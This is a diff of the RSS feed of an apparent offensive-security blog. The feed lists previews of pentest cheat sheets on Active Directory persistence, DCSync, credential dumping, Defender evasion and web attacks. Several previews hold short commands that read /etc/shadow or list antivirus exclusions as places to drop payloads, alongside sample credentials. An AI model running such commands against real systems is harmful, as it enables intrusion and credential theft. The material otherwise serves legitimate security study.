@@ -1,782 +1,157 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>JinPwn</title>
-    <link>https://jinpwn.dev/</link>
-    <description>Recent content on JinPwn</description>
-    <generator>Hugo</generator>
-    <language>en-US</language>
-    <lastBuildDate>Thu, 18 Jun 2026 16:58:31 -0400</lastBuildDate>
-    <atom:link href="https://jinpwn.dev/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Getting Past DPI Without Looking Like a VPN</title>
-      <link>https://jinpwn.dev/posts/blogs/vless-reality-vpn-explained/</link>
-      <pubDate>Sun, 24 May 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/vless-reality-vpn-explained/</guid>
-      <description>Picture a machine sitting between you and the internet, reading every connection you make and sorting them into &amp;ldquo;fine&amp;rdquo; and &amp;ldquo;not fine.&amp;rdquo; That machine is Deep Packet Inspection, or DPI, and it is very good at recognizing a VPN. To get past it you cannot look like a VPN at all. You have to look like the most boring traffic on the network.
-This post explains how VLESS, Xray, and Reality do exactly that, in simple words. No deep networking background needed. If you know what a website and an internet connection are, you can follow along.
-</description>
-    </item>
-    <item>
-      <title>Kerberoasting End to End</title>
-      <link>https://jinpwn.dev/posts/blogs/kerberoasting-end-to-end/</link>
-      <pubDate>Wed, 13 May 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/kerberoasting-end-to-end/</guid>
-      <description>A full walkthrough of Kerberoasting: enumeration, hash extraction, cracking, the targeted variant for accounts without SPNs, and the no-preauth edge case. Covers NetExec, Impacket, Rubeus, targetedKerberoast, and Hashcat.</description>
-    </item>
-    <item>
-      <title>Active Directory Basics</title>
-      <link>https://jinpwn.dev/posts/blogs/active-directory-basics/</link>
-      <pubDate>Sun, 15 Mar 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/active-directory-basics/</guid>
-      <description>Introduction # If you work in IT or cybersecurity, you are going to encounter Active Directory. It is the backbone of almost every corporate network. Trying to learn it by reading disconnected documentation can be frustrating because every concept seems to rely on three other concepts you have not learned yet.
-</description>
-    </item>
-    <item>
-      <title>The Art of Being Silent</title>
-      <link>https://jinpwn.dev/posts/blogs/the-art-of-being-silent/</link>
-      <pubDate>Sat, 14 Mar 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/the-art-of-being-silent/</guid>
-      <description>Introduction # People often buy a VPN, switch to an encrypted messenger, and assume they are secure. They treat security like a shopping list. But tools alone do not protect you. If you use an encrypted messenger to send a screenshot that includes your real name, the encryption did its job perfectly, but you still leaked your identity.
-</description>
-    </item>
-    <item>
-      <title>Visualizing Sorting Algorithms</title>
-      <link>https://jinpwn.dev/posts/blogs/sorting-lgorithms/</link>
-      <pubDate>Wed, 11 Mar 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/sorting-lgorithms/</guid>
-      <description>Introduction # Most developers first learn sorting algorithms by staring at nested loops on a whiteboard. That is usually a mistake.
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>JinPwn</title><link>https://jinpwn.dev/</link><description>Recent content on JinPwn</description><generator>Hugo</generator><language>en-US</language><lastBuildDate>Fri, 19 Jun 2026 12:51:08 -0400</lastBuildDate><atom:link href="https://jinpwn.dev/index.xml" rel="self" type="application/rss+xml"/><item><title>Getting Past DPI Without Looking Like a VPN</title><link>https://jinpwn.dev/posts/blogs/vless-reality-vpn-explained/</link><pubDate>Sun, 24 May 2026 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/posts/blogs/vless-reality-vpn-explained/</guid><description>Picture a machine sitting between you and the internet, reading every connection you make and sorting them into &amp;ldquo;fine&amp;rdquo; and &amp;ldquo;not fine.&amp;rdquo; That machine is Deep Packet Inspection, or DPI, and it is very good at recognizing a VPN. To get past it you cannot look like a VPN at all. You have to look like the most boring traffic on the network.
+This post explains how VLESS, Xray, and Reality do exactly that, in simple words. No deep networking background needed. If you know what a website and an internet connection are, you can follow along.</description></item><item><title>The Art of Being Silent</title><link>https://jinpwn.dev/posts/blogs/the-art-of-being-silent/</link><pubDate>Sat, 14 Mar 2026 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/posts/blogs/the-art-of-being-silent/</guid><description>Introduction # People often buy a VPN, switch to an encrypted messenger, and assume they are secure. They treat security like a shopping list. But tools alone do not protect you. If you use an encrypted messenger to send a screenshot that includes your real name, the encryption did its job perfectly, but you still leaked your identity.</description></item><item><title>Visualizing Sorting Algorithms</title><link>https://jinpwn.dev/posts/blogs/sorting-algorithms/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/posts/blogs/sorting-algorithms/</guid><description>Introduction # Most developers first learn sorting algorithms by staring at nested loops on a whiteboard. That is usually a mistake.
 Sorting is fundamentally a visual process. If you try to memorize the code before you understand how the data actually moves, you will constantly forget how the algorithms work. We need to build an intuition for the mechanics first.
-Before we look at the individual visual patterns, we need to talk about the math that makes some algorithms fast and others painfully slow.
-</description>
-    </item>
-    <item>
-      <title>Boolean-based Blind SQLi with Division-based Extraction</title>
-      <link>https://jinpwn.dev/posts/blogs/boolean-based-blind-sql-injection/</link>
-      <pubDate>Tue, 20 Jan 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/posts/blogs/boolean-based-blind-sql-injection/</guid>
-      <description>Introduction # Hi guys, today I will teach you how to exploit Boolean-based Blind SQL Injection. This is a technique I recently used on a penetration test to extract database usernames without any direct output from the application.
-This one is a bit tricky because you are essentially flying blind. The app does not show you query results, error messages, or anything useful. All you get is a subtle difference in the response: data or no data. But that tiny difference? That is all you need.
-</description>
-    </item>
-    <item>
-      <title>About This Site</title>
-      <link>https://jinpwn.dev/about/</link>
-      <pubDate>Thu, 01 Jan 2026 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/about/</guid>
-      <description>This site is a collection of writeups, notes, and research related to hacking, CTFs, and practical exploitation. Most content is technical and meant to be useful to others working in the same field.
-Focus Areas Network attacks Web application security Reverse engineering and binary exploitation Tool development and automation Tools and Stack Too many to list. Use what works, write what doesn&amp;rsquo;t. Intent I use this space to track my own progress, share useful techniques, and test ideas.
-</description>
-    </item>
-    <item>
-      <title>WEB15 Prototype Pollution</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/</guid>
-      <description>JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).
+Before we look at the individual visual patterns, we need to talk about the math that makes some algorithms fast and others painfully slow.</description></item><item><title>About This Site</title><link>https://jinpwn.dev/about/</link><pubDate>Thu, 01 Jan 2026 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/about/</guid><description>This site is a collection of writeups, notes, and research related to hacking, CTFs, and practical exploitation. Most content is technical and meant to be useful to others working in the same field.
+Focus Areas Network attacks Web application security Reverse engineering and binary exploitation Tool development and automation Tools and Stack Too many to list. Use what works, write what doesn&amp;rsquo;t. Intent I use this space to track my own progress, share useful techniques, and test ideas.</description></item><item><title>WEB15 Prototype Pollution</title><link>https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/</guid><description>JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).
 T=https://target.com i. Where it lives # Prototype pollution requires a code pattern like:
 function merge(target, source) { for (let key in source) { if (typeof source[key] === &amp;#39;object&amp;#39;) { merge(target[key], source[key]); // recursive - pollutes if source has __proto__ } else { target[key] = source[key]; } } } Common surfaces:
-JSON merge / extend / clone helpers (lodash _.merge, jQuery $.extend(true, ...), deep-extend, deeply) Object.assign-like helpers that recursively merge user input Express middleware that merges req.body into options Query string parsers (qs, querystring, express body parser) - controller actions that take entire object directly into merge Configuration loaders that merge user JSON into defaults Mongoose pre-save hooks that merge user data React/Vue prop merging in libraries Two flavors:
-</description>
-    </item>
-    <item>
-      <title>Persistence &amp; Cleanup</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/</guid>
-      <description>Two opposite goals. Persistence: stay in across reboots and re-checks. Cleanup: leave nothing behind on the way out. Always know which one you are doing.
-Scope check first Persistence and backdoors require explicit written authorization on real engagements. On HTB/labs, anything goes. On client work, ask before dropping anything that survives a reboot.
-</description>
-    </item>
-    <item>
-      <title>Persistence</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</guid>
-      <description>After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.
-Scope check AD persistence on a real engagement requires explicit written authorization. Even a &amp;ldquo;harmless&amp;rdquo; backdoor like an ACL change can violate scope. On HTB/labs anything goes.
-</description>
-    </item>
-    <item>
-      <title>Trust Attacks</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</guid>
-      <description>Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.
-DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Trust types # Type Direction Notes Parent-Child Bidirectional, transitive Default inside a forest. Most permissive. Tree-Root Bidirectional, transitive Between two trees in the same forest. External One- or two-way, non-transitive Between domains in different forests (or same). Forest One- or two-way, transitive Between forest roots. SID filtering applied. Realm One- or two-way, transitive Trust to a non-Windows Kerberos realm (Linux). Shortcut Optimization within a forest No new attack surface. ii. Enumerate trusts # bloodyAD as a tree:
-</description>
-    </item>
-    <item>
-      <title>Pivoting</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/12-pivoting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/12-pivoting/</guid>
-      <description>Using a rooted Linux host to reach the next segment. Tool deep-dives (chisel, ligolo, SSH tunnels, proxychains) live in Pivoting . This file is the Linux-specific surface and decision points.
+JSON merge / extend / clone helpers (lodash _.merge, jQuery $.extend(true, ...), deep-extend, deeply) Object.assign-like helpers that recursively merge user input Express middleware that merges req.body into options Query string parsers (qs, querystring, express body parser) - controller actions that take entire object directly into merge Configuration loaders that merge user JSON into defaults Mongoose pre-save hooks that merge user data React/Vue prop merging in libraries Two flavors:</description></item><item><title>Persistence &amp; Cleanup</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/</guid><description>Two opposite goals. Persistence: stay in across reboots and re-checks. Cleanup: leave nothing behind on the way out. Always know which one you are doing.
+Scope check first Persistence and backdoors require explicit written authorization on real engagements. On HTB/labs, anything goes. On client work, ask before dropping anything that survives a reboot.</description></item><item><title>Persistence</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</guid><description>After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.
+Scope check AD persistence on a real engagement requires explicit written authorization. Even a &amp;ldquo;harmless&amp;rdquo; backdoor like an ACL change can violate scope. On HTB/labs anything goes.</description></item><item><title>Trust Attacks</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</guid><description>Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Trust types # Type Direction Notes Parent-Child Bidirectional, transitive Default inside a forest. Most permissive. Tree-Root Bidirectional, transitive Between two trees in the same forest. External One- or two-way, non-transitive Between domains in different forests (or same). Forest One- or two-way, transitive Between forest roots. SID filtering applied. Realm One- or two-way, transitive Trust to a non-Windows Kerberos realm (Linux). Shortcut Optimization within a forest No new attack surface. ii. Enumerate trusts # bloodyAD as a tree:</description></item><item><title>Pivoting</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/12-pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/12-pivoting/</guid><description>Using a rooted Linux host to reach the next segment. Tool deep-dives (chisel, ligolo, SSH tunnels, proxychains) live in Pivoting . This file is the Linux-specific surface and decision points.
 i. First, see what the pivot can reach # ip a ip r arp -a cat /etc/hosts /etc/resolv.conf Look for:
-Extra interfaces (eth1, tun0, docker0) -&amp;gt; separate networks Routes to RFC1918 ranges not in your scope yet DNS servers pointing to internal IPs /etc/hosts entries naming internal services ii. Discover live hosts on the new segment # Without dropping tools:
-</description>
-    </item>
-    <item>
-      <title>Deserialization</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web14-deserialization/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web14-deserialization/</guid>
-      <description>User-controlled data is fed to a deserializer that doesn&amp;rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.
+Extra interfaces (eth1, tun0, docker0) -&amp;gt; separate networks Routes to RFC1918 ranges not in your scope yet DNS servers pointing to internal IPs /etc/hosts entries naming internal services ii. Discover live hosts on the new segment # Without dropping tools:</description></item><item><title>Deserialization</title><link>https://jinpwn.dev/cheatsheets/web/web14-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web14-deserialization/</guid><description>User-controlled data is fed to a deserializer that doesn&amp;rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.
 T=https://target.com i. Where it lives # Anywhere serialized objects cross the trust boundary:
-Cookies (sometimes base64-serialized session blobs) HTTP request bodies (especially API endpoints) Hidden form fields HTTP headers (rare but happens) Queue messages (RabbitMQ, ActiveMQ, etc) consumed by the web app File uploads that get parsed (phar, pickle, marshalled data) Cache contents (memcached, Redis) when the app deserializes WebSocket messages Detect by looking for telltale magic bytes / patterns in any base64 or binary blob you see:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Credentials &amp; Files</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/11-privesc---credentials--files/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/11-privesc---credentials--files/</guid>
-      <description>When privesc isn&amp;rsquo;t a privilege bug but a credential lying around. Always check these in parallel with 06-10.
+Cookies (sometimes base64-serialized session blobs) HTTP request bodies (especially API endpoints) Hidden form fields HTTP headers (rare but happens) Queue messages (RabbitMQ, ActiveMQ, etc) consumed by the web app File uploads that get parsed (phar, pickle, marshalled data) Cache contents (memcached, Redis) when the app deserializes WebSocket messages Detect by looking for telltale magic bytes / patterns in any base64 or binary blob you see:</description></item><item><title>PrivEsc - Credentials &amp; Files</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/11-privesc---credentials--files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/11-privesc---credentials--files/</guid><description>When privesc isn&amp;rsquo;t a privilege bug but a credential lying around. Always check these in parallel with 06-10.
 i. Shadow and passwd # Shadow readable, game over, crack offline:
-ls -la /etc/shadow cat /etc/shadow 2&amp;gt;/dev/null ## Or the backup most admins forget: cat /etc/shadow- /var/backups/shadow* 2&amp;gt;/dev/null Crack with hashcat, see Password Cracking for hash modes ($1 = MD5crypt -m 500, $5 = sha256 -m 7400, $6 = sha512 -m 1800).
-</description>
-    </item>
-    <item>
-      <title>File Upload &amp; LFI</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/</guid>
-      <description>Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.
-T=https://target.com i. Where it lives # File Upload # Avatar / profile picture upload Document attachment (tickets, support, messages) Resume / CV upload (parsed by HR system) Import features (CSV, XML, JSON, archives) File-sharing applications Plugin / theme upload (WordPress, vBulletin, etc) Image processing (thumbnail generation, format conversion) Local File Inclusion (LFI) # ?file= / ?page= / ?template= / ?include= URL parameters Language selectors (?lang=en → include(&#39;lang/&#39; . $_GET[&#39;lang&#39;] . &#39;.php&#39;)) Theme / skin parameters Help / docs viewer endpoints Plugin loaders API endpoints that take filenames Remote File Inclusion (RFI) # Rare in modern PHP (default allow_url_include=Off), but found on legacy installs. Same input pattern as LFI but accepts full URLs.
-</description>
-    </item>
-    <item>
-      <title>DCSync</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</guid>
-      <description>The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.
+ls -la /etc/shadow cat /etc/shadow 2&amp;gt;/dev/null ## Or the backup most admins forget: cat /etc/shadow- /var/backups/shadow* 2&amp;gt;/dev/null Crack with hashcat, see Password Cracking for hash modes ($1 = MD5crypt -m 500, $5 = sha256 -m 7400, $6 = sha512 -m 1800).</description></item><item><title>File Upload &amp; LFI</title><link>https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/</guid><description>Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.
+T=https://target.com i. Where it lives # File Upload # Avatar / profile picture upload Document attachment (tickets, support, messages) Resume / CV upload (parsed by HR system) Import features (CSV, XML, JSON, archives) File-sharing applications Plugin / theme upload (WordPress, vBulletin, etc) Image processing (thumbnail generation, format conversion) Local File Inclusion (LFI) # ?file= / ?page= / ?template= / ?include= URL parameters Language selectors (?lang=en → include('lang/' . $_GET['lang'] . '.php')) Theme / skin parameters Help / docs viewer endpoints Plugin loaders API endpoints that take filenames Remote File Inclusion (RFI) # Rare in modern PHP (default allow_url_include=Off), but found on legacy installs. Same input pattern as LFI but accepts full URLs.</description></item><item><title>DCSync</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</guid><description>The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Who has DCSync rights by default # These groups have the DS-Replication-Get-Changes + DS-Replication-Get-Changes-All extended rights on the domain object:
-Domain Admins Enterprise Admins Administrators (BUILTIN) Domain Controllers Read-only Domain Controllers (partial) Account Operators (no, but Read-only via specific ACLs in some configs) Any account explicitly delegated the right (Exchange installs, monitoring tools, third-party syncs) ii. Find DCSync-capable principals # BloodHound query:
-</description>
-    </item>
-    <item>
-      <title>SSRF</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web12-ssrf/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web12-ssrf/</guid>
-      <description>The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.
+Domain Admins Enterprise Admins Administrators (BUILTIN) Domain Controllers Read-only Domain Controllers (partial) Account Operators (no, but Read-only via specific ACLs in some configs) Any account explicitly delegated the right (Exchange installs, monitoring tools, third-party syncs) ii. Find DCSync-capable principals # BloodHound query:</description></item><item><title>SSRF</title><link>https://jinpwn.dev/cheatsheets/web/web12-ssrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web12-ssrf/</guid><description>The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.
 T=https://target.com i. Where it lives # Obvious SSRF surfaces:
-&amp;ldquo;Fetch URL&amp;rdquo; / &amp;ldquo;Import from URL&amp;rdquo; / &amp;ldquo;Webhook URL&amp;rdquo; Profile picture URL import PDF generator that fetches assets (logos, images via URL) Open Graph link preview (chat apps, social cards) File upload via URL &amp;ldquo;Test this connection&amp;rdquo; / health check features RSS feed importers Image proxies (avatar caches) SAML / OIDC client_id / metadata URL parameters XML/JSON-LD with $ref or @id fields Less obvious:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Kernel &amp; Exploits</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/10-privesc---kernel--exploits/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/10-privesc---kernel--exploits/</guid>
-      <description>Last resort. Kernel exploits crash boxes, leave traces, and can be patched but the userland still shows the vulnerable banner. Try 06-09 and 11 first.
+&amp;ldquo;Fetch URL&amp;rdquo; / &amp;ldquo;Import from URL&amp;rdquo; / &amp;ldquo;Webhook URL&amp;rdquo; Profile picture URL import PDF generator that fetches assets (logos, images via URL) Open Graph link preview (chat apps, social cards) File upload via URL &amp;ldquo;Test this connection&amp;rdquo; / health check features RSS feed importers Image proxies (avatar caches) SAML / OIDC client_id / metadata URL parameters XML/JSON-LD with $ref or @id fields Less obvious:</description></item><item><title>PrivEsc - Kernel &amp; Exploits</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/10-privesc---kernel--exploits/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/10-privesc---kernel--exploits/</guid><description>Last resort. Kernel exploits crash boxes, leave traces, and can be patched but the userland still shows the vulnerable banner. Try 06-09 and 11 first.
 i. Identify the kernel and distro # uname -a uname -r ## kernel only cat /etc/os-release cat /proc/version arch ## x86_64, aarch64, etc Get the GLIBC version, many exploits are libc-version-dependent:
-ldd --version | head -1 ls -la /lib/x86_64-linux-gnu/libc.so.6 /lib64/libc.so.6 2&amp;gt;/dev/null ii. Run a suggester # linux-exploit-suggester (les) and linux-exploit-suggester-2 (les2):
-</description>
-    </item>
-    <item>
-      <title>Lateral Movement</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/</guid>
-      <description>Move from one Windows host to the next. Most techniques need creds (or NTLM hash, or Kerberos ticket). Tickets and trust attacks live in AD MOC .
+ldd --version | head -1 ls -la /lib/x86_64-linux-gnu/libc.so.6 /lib64/libc.so.6 2&amp;gt;/dev/null ii. Run a suggester # linux-exploit-suggester (les) and linux-exploit-suggester-2 (les2):</description></item><item><title>Lateral Movement</title><link>https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/</guid><description>Move from one Windows host to the next. Most techniques need creds (or NTLM hash, or Kerberos ticket). Tickets and trust attacks live in AD MOC .
 T=10.10.11.50 USER=Administrator PASS=&amp;#39;Passw0rd!&amp;#39; NTHASH=&amp;#39;8846f7eaee8fb117ad06bdd830b7586c&amp;#39; DOMAIN=corp.local i. Decision matrix # What you have -&amp;gt; what to use:
-Auth Best tool User + password nxc / impacket-psexec / evil-winrm Username + NTLM hash nxc -H / impacket-psexec -hashes / evil-winrm -H Kerberos TGT (.ccache) KRB5CCNAME= + impacket -k -no-pass TGS for a specific service KRB5CCNAME= + same flag Token of an existing logged-on user runas / token::elevate (mimikatz) What&amp;rsquo;s open on the target -&amp;gt; what to use:
-</description>
-    </item>
-    <item>
-      <title>Defender &amp; AMSI Evasion</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/</guid>
-      <description>Modern Windows has Defender on by default. AMSI scans PowerShell/.NET/VBScript content before execution. EDRs hook userland APIs. Bypasses get patched and re-invented constantly, treat any single technique as a temporary win.
+Auth Best tool User + password nxc / impacket-psexec / evil-winrm Username + NTLM hash nxc -H / impacket-psexec -hashes / evil-winrm -H Kerberos TGT (.ccache) KRB5CCNAME= + impacket -k -no-pass TGS for a specific service KRB5CCNAME= + same flag Token of an existing logged-on user runas / token::elevate (mimikatz) What&amp;rsquo;s open on the target -&amp;gt; what to use:</description></item><item><title>Defender &amp; AMSI Evasion</title><link>https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/</guid><description>Modern Windows has Defender on by default. AMSI scans PowerShell/.NET/VBScript content before execution. EDRs hook userland APIs. Bypasses get patched and re-invented constantly, treat any single technique as a temporary win.
 i. Check what you&amp;rsquo;re up against # Defender status:
 Get-MpComputerStatus ## Look at: AntivirusEnabled, RealTimeProtectionEnabled, IsTamperProtected Get-MpPreference | Select-Object Disable*, ExclusionPath, ExclusionExtension, ExclusionProcess Defender exclusions (gold mine, drop payloads to excluded paths):
-Get-MpPreference | Select-Object -ExpandProperty ExclusionPath Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess As a low-priv user when Get-MpPreference is blocked or empty, pull exclusions from the event log. Event ID 5007 in Microsoft-Windows-Windows Defender/Operational logs every config change, including exclusion adds:
-</description>
-    </item>
-    <item>
-      <title>Credential Dumping</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</guid>
-      <description>Pull credentials from anywhere in AD: from the DC&amp;rsquo;s NTDS.dit, from local SAM, from LSASS, from gMSA blobs, from LAPS attributes. DCSync gets its own file because it&amp;rsquo;s the single most important credential dump path, see DCSync .
-DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Remote SAM + LSA dump (local admin needed) # When you&amp;rsquo;re local admin on any host (not DC), secretsdump pulls the local SAM, LSA secrets, cached domain creds:
-</description>
-    </item>
-    <item>
-      <title>Web Cache Poisoning</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web11-web-cache-poisoning/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web11-web-cache-poisoning/</guid>
-      <description>The cache stores attacker-controlled content under a victim-accessible URL. One request poisons the cache, all subsequent visitors get the malicious response.
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess As a low-priv user when Get-MpPreference is blocked or empty, pull exclusions from the event log. Event ID 5007 in Microsoft-Windows-Windows Defender/Operational logs every config change, including exclusion adds:</description></item><item><title>Credential Dumping</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</guid><description>Pull credentials from anywhere in AD: from the DC&amp;rsquo;s NTDS.dit, from local SAM, from LSASS, from gMSA blobs, from LAPS attributes. DCSync gets its own file because it&amp;rsquo;s the single most important credential dump path, see DCSync .
